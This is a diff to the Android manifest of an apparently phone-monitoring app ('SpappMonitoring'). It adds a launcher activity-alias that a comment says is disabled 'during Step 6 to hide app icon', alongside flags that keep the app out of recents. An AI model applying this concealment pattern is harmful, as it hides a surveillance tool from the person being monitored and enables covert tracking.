@@ -77,18 +77,28 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.SpappMonitoring">
 
-        <!-- Visible launcher entry point -->
+        <!-- Base SplashActivity (non-launcher target) -->
         <activity
             android:name=".ui.SplashActivity"
             android:excludeFromRecents="true"
             android:autoRemoveFromRecents="true"
             android:exported="true"
-            android:theme="@style/Theme.SpappMonitoring">
+            android:theme="@style/Theme.SpappMonitoring" />
+
+        <!-- Activity alias that shows icon on home screen; disabled during Step 6 to hide app icon -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".ui.SplashActivity"
+            android:label="@string/app_name"
+            android:icon="@mipmap/ic_launcher"
+            android:roundIcon="@mipmap/ic_launcher"
+            android:enabled="true"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Mandatory first-launch consent screen -->
         <activity
